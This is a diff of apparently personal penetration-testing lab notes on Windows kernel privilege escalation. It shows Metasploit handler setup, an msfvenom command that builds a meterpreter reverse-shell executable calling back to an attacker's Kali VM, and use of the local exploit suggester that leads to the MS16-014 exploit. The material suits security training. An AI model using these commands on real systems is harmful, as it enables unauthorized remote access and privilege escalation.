@@ -33,10 +33,8 @@ set smbdomain
 run
 
 
-# использование эксплйтов ядра
-Kali VM
+# использование эксплйтов ядра Expoloit Suggester
 
-1. Open command prompt and type: msfconsole
 2. In Metasploit (msf > prompt) type: use multi/handler
 3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
 4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
@@ -44,13 +42,9 @@ Kali VM
 6. Open an additional command prompt and type: msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe > shell.exe
 7. Copy the generated file, shell.exe, to the Windows VM.
 
-Windows VM
 
-1. Execute shell.exe and obtain reverse shell
-
-Detection & Exploitation
-
-Kali VM
+background
+session -i
 
 1. In Metasploit (msf > prompt) type: run post/multi/recon/local_exploit_suggester
 2. Identify exploit/windows/local/ms16_014_wmi_recv_notif as a potential privilege escalation
